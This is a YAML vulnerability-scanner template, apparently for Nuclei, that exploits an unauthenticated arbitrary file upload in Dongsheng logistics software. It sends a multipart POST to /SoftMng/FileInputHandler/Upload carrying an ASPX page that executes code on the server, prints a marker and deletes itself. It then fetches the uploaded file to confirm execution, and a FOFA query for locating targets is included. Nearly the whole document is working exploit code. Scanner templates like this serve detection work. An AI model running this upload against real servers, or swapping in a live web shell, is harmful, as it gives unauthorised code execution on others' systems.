http:
    - extractors:
        - group: 1
          internal: true
          name: uploadfile
          part: body
          regex:
            - ([a-zA-Z0-9]+_[a-zA-Z0-9]+\.aspx)
          type: regex
        - group: 1
          internal: true
          name: time
          part: body
          regex:
            - (/+[0-9]+)
          type: regex
      raw:
        - |
          POST /SoftMng/FileInputHandler/Upload HTTP/1.1
          Host: {{Hostname}}
          Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryaKljzbg49Mq4ggLz

          ------WebKitFormBoundaryaKljzbg49Mq4ggLz
          Content-Disposition: form-data; name="file"; filename="{{username}}.aspx"
          Content-Type: application/octet-stream

          <%@Page Language="C#"%><%Response.Write("pboyjnnrfipmplsukdeczudsefxmywe");System.IO.File.Delete(Request.PhysicalPath);%>
          ------WebKitFormBoundaryaKljzbg49Mq4ggLz--
    - matchers:
        - part: body
          type: word
          words:
            - pboyjnnrfipmplsukdeczudsefxmywe
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          GET /UploadFiles/Filepuload{{time}}/{{uploadfile}} HTTP/1.1
          Host: {{Hostname}}
id: dongshengwuliu-Upload-File-upload
info:
    author: Superhero
    description: |-
        fofa: app="东胜物流软件-物流软件"
        东胜物流软件 Upload 接口存在任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
    name: 东胜物流软件 Upload 任意文件上传漏洞
    reference:
        - https://mp.weixin.qq.com/s/6XO_5a4341bDqZF_gTyVhg
    severity: high
    tags:
        - 东胜物流软件
variables:
    username: '{{to_lower(rand_base(6))}}'
